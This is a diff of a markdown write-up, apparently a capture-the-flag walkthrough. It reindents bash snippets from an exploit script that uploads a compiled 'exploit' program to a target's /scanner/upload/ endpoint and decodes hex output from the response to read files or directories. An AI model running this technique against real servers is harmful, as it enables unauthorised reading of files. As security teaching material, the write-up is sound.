@@ -10,20 +10,20 @@ First of all, to use this script we must provide some parameters:
 
 ```bash
 function help() {
-  echo "[!] Usage: bash $0 <host> <f|d> <path-to-file|dir>"
-	exit 1
+        echo "[!] Usage: bash $0 <host> <f|d> <path-to-file|dir>"
+	      exit 1
 }
 
 host=$1
 
 if [ "$2" = "f" ]; then
-	read_file=1
-	file=$3
+	      read_file=1
+	      file=$3
 elif [ "$2" = "d" ]; then
-  read_file=0
-	dir=$3
+        read_file=0
+	      dir=$3
 else
-	help
+	      help
 fi
 ```
 
@@ -35,11 +35,11 @@ After that, the C program is compiled. Then we upload it and filter the results 
 res=$(curl $host/scanner/upload/ -sLF file=@exploit)
 
 hex=$(echo "$res" \
-  | grep execve \
-  | awk -F = '{ print $3 }' \
-  | sed 's/<\/pre>//g' \
-  | awk -F x '{ printf "%16s\n", $2 }' \
-  | tr ' ' 0)
+        | grep execve \
+        | awk -F = '{ print $3 }' \
+        | sed 's/<\/pre>//g' \
+        | awk -F x '{ printf "%16s\n", $2 }' \
+        | tr ' ' 0)
 
 echo "$hex" | xxd -r -p
 echo
